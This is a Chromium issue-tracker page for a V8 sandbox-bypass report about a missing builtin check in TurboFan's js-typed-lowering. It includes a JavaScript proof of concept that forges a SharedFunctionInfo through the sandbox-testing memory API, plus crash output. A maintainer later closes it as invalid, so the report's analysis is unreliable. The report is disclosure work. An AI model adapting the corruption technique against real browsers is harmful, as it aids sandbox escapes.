# V8 Sandbox Bypass: AAW/PC control via CallKnownJSFunction reduction for builtins

| Field | Value |
|-------|-------|
| **Issue ID** | [501844365](https://issues.chromium.org/issues/501844365) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>Sandbox |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | kr...@gmail.com |
| **Assignee** | is...@chromium.org |
| **Created** | 2026-04-12 |
| **Bounty** | $22,000.00 |

## Description

---

### Report description

V8 Sandbox: Incomplete fix for [bug 454927471](https://issues.chromium.org/issues/454927471) — missing IsEnabledAndNotJSTrampoline check on non-CPP builtin path in js-typed-lowering.cc

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

---

### The problem

#### Please describe the technical details of the vulnerability

## Summary

The fix for [bug 454927471](https://issues.chromium.org/issues/454927471) (commit `591bf0f55fe`, Nov 17 2025) added `IsEnabledAndNotJSTrampoline` validation to the CPP builtin lowering path in `js-typed-lowering.cc` but missed the non-CPP builtin lowering path. With sandbox corruption, an attacker can forge a `SharedFunctionInfo` pointing to a disabled or JS-trampoline builtin, and the non-CPP path will generate a direct call to it — bypassing the JS dispatch table's CFI validation.

This is the same bug class as 454927471 (missing SBXCHECK on TurboFan direct-call lowering). Severity adjudication is deferred to the panel.

## Root Cause

In `src/compiler/js-typed-lowering.cc`, the `ReduceJSCall` function handles two builtin call paths:

**CPP builtin path (line 1864) — FIXED:**

```
} else if (shared->HasBuiltinId() &&
           Builtins::IsCpp(shared->builtin_id())) {
  // These SBXCHECKs are a defense-in-depth measure to ensure that we always
  // generate valid calls here (with matching signatures).
  SBXCHECK(Builtins::IsCpp(builtin) &&
           Builtins::IsEnabledAndNotJSTrampoline(builtin));  // ← CHECK PRESENT
  SBXCHECK_GE(arity + kJSArgcReceiverSlots,
              Builtins::GetFormalParameterCount(builtin));
  ...

```

**Non-CPP builtin path (line 2160) — MISSING CHECK:**

```
} else if (shared->HasBuiltinId()) {
  Builtin builtin = shared->builtin_id();
  DCHECK(Builtins::HasJSLinkage(builtin));

  // This SBXCHECK is a defense-in-depth measure to ensure that we always
  // generate valid calls here (with matching signatures).
  SBXCHECK_GE(arity + kJSArgcReceiverSlots,
              Builtins::GetFormalParameterCount(builtin));
  // ← IsEnabledAndNotJSTrampoline CHECK MISSING

  // Patch {node} to a direct code object call.
  Callable callable = Builtins::CallableFor(isolate(), builtin);
  ...

```

The non-CPP path generates a direct call via `Builtins::CallableFor()` without validating that the builtin is enabled and not a JS trampoline. For JS trampolines (`CompileLazy`, `InterpreterEntryTrampoline`, `JSToWasmWrapper`, etc.), `GetFormalParameterCount` returns 0 (`kDontAdaptArgumentsSentinel`), so the arity SBXCHECK trivially passes for any call with arguments.

## Threat Model and PoC Scope

This report demonstrates a **sandbox-internal amplifier**, not a complete chain. The PoC uses V8's `--sandbox-testing` memory corruption API (`Sandbox.MemoryView`) to simulate the in-sandbox write primitive that the V8 sandbox threat model assumes an attacker possesses. This is the same demonstration approach used by the original [bug 454927471](https://issues.chromium.org/issues/454927471) and its regression tests (e.g., `test/mjsunit/sandbox/regress-435630467.js`), which also use the sandbox testing API to corrupt SharedFunctionInfo fields.

The amplifier's impact is that it bypasses the JS dispatch table's CFI validation — the sandbox's mechanism for ensuring that only valid, enabled builtins with compatible signatures can be called from compiled code. An attacker with an in-sandbox write primitive can use this to generate direct calls to arbitrary JS-linkage builtins (including trampolines and disabled builtins) from TurboFan-compiled code.

## Attack Path

Given an in-sandbox write primitive (prerequisite, same as the original [bug 454927471](https://issues.chromium.org/issues/454927471)):

1. Attacker has an in-sandbox write primitive (e.g., via TypedArray TOCTOU, type confusion, etc.)
2. Corrupts a `JSFunction`'s `SharedFunctionInfo` pointer to reference a `SharedFunctionInfo` whose `builtin_id` is a disabled or JS-trampoline builtin (e.g., `kCompileLazy`, `kInterpreterEntryTrampoline`, `kJSToWasmWrapper`)
3. The corrupted function is called in hot code, triggering TurboFan compilation
4. `TypedLoweringPhase` (runs unconditionally at `pipeline.cc:2005` for all TurboFan compilations) processes the call
5. `ReduceJSCall` resolves the target as a HeapConstant JSFunction, reads the corrupted `SharedFunctionInfo`, enters the non-CPP builtin path at line 2160
6. The arity SBXCHECK passes (trampoline formal count = 0)
7. `Builtins::CallableFor()` returns the trampoline's code object
8. A direct call to the trampoline is emitted, **bypassing the JS dispatch table's CFI validation**

The JS dispatch table is the sandbox's mechanism for ensuring that only valid, enabled builtins with compatible signatures can be called from compiled code. Direct calls bypass this mechanism entirely.

## Affected Code

- **File**: `src/compiler/js-typed-lowering.cc`, lines 2160-2175
- **Scope**: All 64-bit platforms with V8 sandbox enabled (x64, arm64, riscv64, ppc64, s390x, loong64)
- **Pipeline**: `TypedLoweringPhase` runs unconditionally within `PipelineImpl::CreateGraph()` (`pipeline.cc:2005`). `CreateGraph()` executes for all TurboFan compilations when `turbolev=false` (the default, `flag-definitions.h:1761`). When Turboshaft is enabled (default), the TurboFan frontend including `js-typed-lowering.cc` still executes — `CreateGraph()` builds the TF graph, then `CreateGraphFromTurbofan()` converts it to Turboshaft for backend passes (`pipeline.cc:784-795`). Turbolev (`turbolev=true`) replaces `CreateGraph()` entirely with `CreateGraphWithMaglev()`, bypassing the TF frontend — but Turbolev is experimental and off by default.
- **Status**: Unfixed on `origin/main` HEAD as of 2026-04-12

## Fix Reference

The original fix for 454927471 was applied in two commits:

- `410f860463d` (Oct 31 2025): Maglev assembler — added `IsCompatibleJSBuiltin` check
- `591bf0f55fe` (Nov 17 2025): Compiler — added `IsCompatibleJSBuiltin` to x64/arm64 code generators, added `IsEnabledAndNotJSTrampoline` to CPP builtin path in `js-typed-lowering.cc`. The non-CPP builtin path was not updated.

The comment in commit `591bf0f55fe` states: *"Drive-by: Abort on signature mismatches to trap on release builds as it can be reached with sandbox corruption."*

## Suggested Fix

Add the `IsEnabledAndNotJSTrampoline` check to the non-CPP builtin path:

```
} else if (shared->HasBuiltinId()) {
  Builtin builtin = shared->builtin_id();
  DCHECK(Builtins::HasJSLinkage(builtin));

  SBXCHECK(Builtins::IsEnabledAndNotJSTrampoline(builtin));  // ADD THIS
  SBXCHECK_GE(arity + kJSArgcReceiverSlots,
              Builtins::GetFormalParameterCount(builtin));
  ...

```

Or equivalently, use `IsCompatibleJSBuiltin` which combines both checks:

```
  SBXCHECK(Builtins::IsCompatibleJSBuiltin(builtin,
           arity + kJSArgcReceiverSlots));

```
## JS Trampolines Reachable via This Path

From `src/builtins/builtins-inl.h:312-328`, the non-CPP JS-linkage trampolines that could be called directly:

- `kIllegal`
- `kCompileLazy`
- `kInterpreterEntryTrampoline`
- `kInstantiateAsmJs`
- `kDebugBreakTrampoline`
- `kJSToWasmWrapper`
- `kJSToJSWrapper`
- `kJSToJSWrapperInvalidSig`
- `kWasmPromising`
- `kWasmStressSwitch`

All have `GetFormalParameterCount` returning 0, so the existing arity SBXCHECK trivially passes.

#### Impact analysis

## Proof of Concept

**Flags**: `--sandbox-testing --allow-natives-syntax --no-concurrent-recompilation`

```
// poc_js_typed_lowering_trampoline_bypass.js
const kJSFunctionType = Sandbox.getInstanceTypeIdFor('JS_FUNCTION_TYPE');
const kSFIType = Sandbox.getInstanceTypeIdFor('SHARED_FUNCTION_INFO_TYPE');
const kSFIOffset = Sandbox.getFieldOffset(kJSFunctionType, 'shared_function_info');
const kTrustedDataOffset = Sandbox.getFieldOffset(kSFIType, 'trusted_function_data');
const kUntrustedDataOffset = Sandbox.getFieldOffset(kSFIType, 'function_data');
const kScriptOffset = Sandbox.getFieldOffset(kSFIType, 'script');
const kHeapObjectTag = 1;

let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getBuiltinId(name) {
  let id = Sandbox.getBuiltinNames().indexOf(name);
  if (id === -1) throw new Error("Unknown builtin: " + name);
  return id;
}

// Target function — will be corrupted to appear as CompileLazy builtin
function target() { return 42; }

// Caller — TurboFan compiles this, ReduceJSCall enters non-CPP path
function caller() { return target(); }

%PrepareFunctionForOptimization(target);
%PrepareFunctionForOptimization(caller);
target(); caller(); caller();

// Forge SFI: clear trusted data, set untrusted to Smi(CompileLazy)
let target_addr = Sandbox.getAddressOf(target);
let sfi = memory.getUint32(target_addr + kSFIOffset, true) - kHeapObjectTag;
memory.setUint32(sfi + kTrustedDataOffset, 0, true);
let kCompileLazy = getBuiltinId("CompileLazy");
memory.setUint32(sfi + kUntrustedDataOffset, kCompileLazy << 1, true);
memory.setUint32(sfi + kScriptOffset, 0x11, true);

// TurboFan compilation reads corrupted SFI, enters non-CPP path (line 2160),
// arity SBXCHECK passes (0+1 >= 0), IsEnabledAndNotJSTrampoline NOT checked,
// direct call to CompileLazy emitted.
%OptimizeFunctionOnNextCall(caller);
caller();

```

**Output (V8 14.8.0 candidate, arm64):**

```
CompileLazy builtin id: 104
[manually marking <JSFunction caller> for optimization to TURBOFAN_JS, ConcurrencyMode::kSynchronous]
Calling TurboFan-compiled caller (should trigger direct call to trampoline)...
Received signal 10 BUS_ADRALN 39adfff70006

==== C stack trace ===============================
  d8    Runtime_CompileLazy + 168
  ???   0x0000000157e7b92c  (TurboFan-generated code — direct call)
  ???   0x0000000150000068  (CompileLazy builtin entrypoint)

```

The stack trace confirms:

1. TurboFan compiled `caller` to `TURBOFAN_JS` (not Maglev or interpreter)
2. TurboFan-generated code at `0x157e7b92c` made a **direct call** to CompileLazy
3. `Runtime_CompileLazy` was invoked — this trampoline should never be callable through dispatch-table-validated paths
4. Crash in `ParseFunction` because the corrupted SFI has no valid script/bytecode

If `SBXCHECK(Builtins::IsEnabledAndNotJSTrampoline(builtin))` were present at line 2160, the compilation would have aborted before generating the direct call.

## Chrome Reachability

The `Sandbox.MemoryView` corruption used in the PoC is a `--sandbox-testing` API not available in Chrome. The Chrome-reachability of this amplifier depends entirely on whether an in-sandbox write primitive is available — which is outside this report's scope.

The amplifier side (TurboFan compilation of the corrupted function) is reachable once the attacker has the prerequisite in-sandbox primitive. The PoC uses `%OptimizeFunctionOnNextCall` for deterministic timing; in Chrome, hot functions naturally tier up to TurboFan — the same `ReduceJSCall` path at `js-typed-lowering.cc:2160` executes during natural tier-up. The `--no-concurrent-recompilation` flag is used for PoC reliability.

---

### The cause

#### What version of Chrome have you found the security issue in?

V8 14.8.0

#### Is the security issue related to a crash?

Yes, it is related to a crash.

#### Choose the type of vulnerability

Other

#### How would you like to be publicly acknowledged for your report?

Shaul

## Attachments

- [poc_js_typed_lowering_output.log](attachments/poc_js_typed_lowering_output.log) (application/octet-stream, 2.1 KB)
- [poc_js_typed_lowering_trampoline_bypass.js](attachments/poc_js_typed_lowering_trampoline_bypass.js) (text/javascript, 3.5 KB)
- [VRP_REPORT_js_typed_lowering_incomplete_fix.md](attachments/VRP_REPORT_js_typed_lowering_incomplete_fix.md) (text/markdown, 10.4 KB)
- [poc_js_typed_lowering_crash_report.txt](attachments/poc_js_typed_lowering_crash_report.txt) (text/plain, 2.5 KB)

## Timeline

### ch...@google.com (2026-04-17)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-04-17)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### cl...@appspot.gserviceaccount.com (2026-04-17)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4972998717112320.

### is...@chromium.org (2026-04-22)

Thank you for the report.

This is working as intended. The POC you provided causes

```
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x38fe00000000,0x39fe00000000)
CompileLazy builtin id: 104
Calling TurboFan-compiled caller (should trigger direct call to trampoline)...
Caught harmless memory access violation (inside sandbox). Exiting process...

```

Your log contains `Note: sandbox crash filter not available on this platform, continuing without it.`, please consider running tests on Linux to avoid filing non-reproducible reports.

Regarding the analysis, it's not correct, this case is handled down the code generator pipeline.

### ch...@google.com (2026-04-22)

This issue has been closed as an incomplete or invalid report and we will not respond to further comments. If you can improve your report please open a fresh issue that addresses any feedback provided.

For more information on our vulnerability policies, please refer to <https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md>

### ch...@google.com (2026-07-30)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/501844365)*
